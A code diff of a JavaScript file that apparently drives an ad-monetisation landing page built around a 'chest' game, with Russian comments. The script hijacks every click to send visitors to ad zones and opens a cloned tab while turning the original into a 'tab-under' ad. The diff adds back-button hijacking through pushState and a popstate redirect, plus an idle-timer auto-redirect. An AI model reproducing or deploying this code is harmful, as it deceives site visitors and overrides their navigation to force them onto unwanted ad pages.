@@ -1,11 +1,8 @@
-/* common.js — FINAL DUAL LOGIC (Clone + Dual Exit) */
+/* common.js — FINAL FIXED (Chest Lost = Clone) */
 
 (() => {
   "use strict";
 
-  // ---------------------------
-  // Helpers
-  // ---------------------------
   const safe = (fn) => { try { return fn(); } catch { return undefined; } };
   
   const replaceTo = (url) => {
@@ -20,9 +17,6 @@
     } catch { return null; }
   };
 
-  // ---------------------------
-  // URL + params
-  // ---------------------------
   const curUrl = new URL(window.location.href);
   const getSP = (k, def = "") => curUrl.searchParams.get(k) ?? def;
   const CLONE_PARAM = "__cl";
@@ -58,9 +52,6 @@
     } catch { return ""; }
   };
 
-  // ---------------------------
-  // Config Normalizer
-  // ---------------------------
   const normalizeConfig = (appCfg) => {
     if (!appCfg || typeof appCfg !== "object" || !appCfg.domain) return null;
     const cfg = { domain: appCfg.domain };
@@ -69,7 +60,6 @@
     Object.entries(appCfg).forEach(([k, v]) => {
       if (v == null || v === "" || k === "domain") return;
 
-      // Парсинг mainExit_newTab_zoneId и mainExit_currentTab_zoneId
       let m = k.match(/^([a-zA-Z0-9]+)_(currentTab|newTab)_(zoneId|url)$/);
       if (m) {
         const [, name, tab, field] = m;
@@ -82,7 +72,6 @@
       m = k.match(/^([a-zA-Z0-9]+)_(count|timeToRedirect|pageUrl)$/);
       if (m) { ensure(m[1])[m[2]] = v; return; }
       
-      // Обратная совместимость для tabUnderClick_zoneId -> это newTab (для логики скрипта)
       m = k.match(/^([a-zA-Z0-9]+)_(zoneId|url)$/);
       if (m) {
         const [, name, field] = m;
@@ -95,9 +84,6 @@
     return cfg;
   };
 
-  // ---------------------------
-  // URL Builders & Exits
-  // ---------------------------
   const buildExitQSFast = ({ zoneId }) => {
     const base = {
       ymid: IN.var_1 || IN.var || "", var: IN.var_2 || IN.z || "", var_3: IN.var_3 || "",
@@ -147,14 +133,12 @@
     return "";
   };
 
-  // === DUAL EXIT (New Tab + Current Tab Redirect) ===
-  // Это срабатывает для MainExit в Клоне
   const runExitDualTabsFast = (cfg, name, withBack = true) => {
     const ex = cfg?.[name];
     if (!ex) return;
     
-    const ct = ex.currentTab; // Фон (10536647)
-    const nt = ex.newTab;     // Новая вкладка (10537802)
+    const ct = ex.currentTab; 
+    const nt = ex.newTab;     
     
     const ctUrl = resolveUrlFast(ct, cfg);
     const ntUrl = resolveUrlFast(nt, cfg);
@@ -165,11 +149,7 @@
     });
 
     if (withBack) initBackFast(cfg);
-
-    // 1. Открываем Оффер в новой вкладке
     if (ntUrl) openTab(ntUrl);
-    
-    // 2. Редиректим текущую вкладку на фон
     if (ctUrl) { setTimeout(() => replaceTo(ctUrl), 40); }
   };
 
@@ -183,17 +163,30 @@
     else { replaceTo(url); }
   };
 
-  // Универсальный запускатор
   const run = (cfg, name) => {
-    // Если есть настройка newTab (как у тебя для mainExit), запускаем DUAL
     if (cfg?.[name]?.newTab) return runExitDualTabsFast(cfg, name, true);
-    // Иначе обычный (только текущая)
     return runExitCurrentTabFast(cfg, name, true);
   };
 
-  // ---------------------------
-  // Micro Handoff Logic (Original Tab)
-  // ---------------------------
+  // --- REVERSE ---
+  const initReverse = (cfg) => {
+    if (!cfg?.reverse?.currentTab) return;
+    safe(() => window.history.pushState({ __rev: 1 }, "", window.location.href));
+    window.addEventListener("popstate", () => { runExitCurrentTabFast(cfg, "reverse", false); });
+  };
+
+  const initAutoexit = (cfg) => {
+    if (!cfg?.autoexit?.currentTab) return;
+    const sec = parseInt(cfg.autoexit.timeToRedirect, 10) || 90;
+    let armed = false;
+    const trigger = () => { if (document.visibilityState === "visible" && armed) runExitCurrentTabFast(cfg, "autoexit", true); };
+    const timer = setTimeout(() => { armed = true; trigger(); }, sec * 1000);
+    const cancel = () => { clearTimeout(timer); document.removeEventListener("visibilitychange", trigger); };
+    document.addEventListener("visibilitychange", trigger);
+    ["mousemove", "click", "scroll"].forEach(ev => document.addEventListener(ev, cancel, { once: true }));
+  };
+
+  // --- MICRO HANDOFF ---
   const buildCloneUrl = () => {
     const u = new URL(window.location.href);
     u.searchParams.set(CLONE_PARAM, "1");
@@ -202,19 +195,14 @@
   };
 
   const runMicroHandoff = (cfg) => {
-    // Защита: в клоне это не должно работать, там работает mainExit
     if (isClone) {
         run(cfg, "mainExit");
         return;
     }
-
-    // 1. Открываем Клон (__cl=1) в новой вкладке
     const cloneUrl = buildCloneUrl();
     safe(() => window.syncMetric?.({ event: "micro_open_clone" }));
     openTab(cloneUrl);
 
-    // 2. Текущую (Original) редиректим на TabUnder (10576300)
-    // В конфиге tabUnderClick парсится как newTab, но мы берем url
     const ex = cfg?.tabUnderClick?.newTab || cfg?.tabUnderClick?.currentTab;
     const monetUrl = resolveUrlFast(ex, cfg);
 
@@ -223,16 +211,14 @@
       initBackFast(cfg);
       setTimeout(() => replaceTo(monetUrl), 40);
     } else {
-      // Если табандера нет, делаем mainExit
       run(cfg, "mainExit");
     }
   };
 
-  // ---------------------------
-  // Click Map
-  // ---------------------------
+  // --- CLICK MAP ---
   const initClickMap = (cfg) => {
     let fired = false;
+    // ⬇️⬇️⬇️ ВОТ ЗДЕСЬ ИСПРАВЛЕНИЕ: chest_lost добавлен в список ⬇️⬇️⬇️
     const microTargets = new Set(["chest_play", "chest_lost", "banner_close", "modal_stay"]);
 
     document.addEventListener("click", (e) => {
@@ -241,23 +227,21 @@
       const modal = document.getElementById("xh_exit_modal");
       const banner = document.getElementById("xh_banner");
 
-      // 1. КЛОН (WIN) -> MAIN EXIT (DUAL)
       if (isClone) {
         if (fired) return;
         fired = true;
         e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
-        run(cfg, "mainExit"); // Тут сработает Dual Exit из-за конфига
+        run(cfg, "mainExit");
         return;
       }
 
-      // 2. ОРИГИНАЛ
       if (!t && document.documentElement.dataset.landingName === "chest") return;
 
       if (t === "banner_main") {
         e.preventDefault(); run(cfg, "mainExit"); return;
       }
       
-      // 3. MICRO HANDOFF (Первый клик)
+      // Ловим chest_lost (и chest_play) и запускаем клона
       if (microTargets.has(t)) {
         e.preventDefault(); e.stopPropagation();
         if (banner) banner.style.display = "none";
@@ -266,12 +250,10 @@
         return;
       }
 
-      // 4. Остальное
       if (fired) return;
       fired = true;
       e.preventDefault();
       run(cfg, "mainExit");
-
     }, true);
   };
 
@@ -281,7 +263,10 @@
     if (!cfg) return;
 
     window.LANDING_EXITS = { cfg, run: (name) => run(cfg, name) };
+    
     initClickMap(cfg);
+    initAutoexit(cfg);
+    initReverse(cfg); // Инициализация Reverse (назад)
   };
 
   if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", boot);
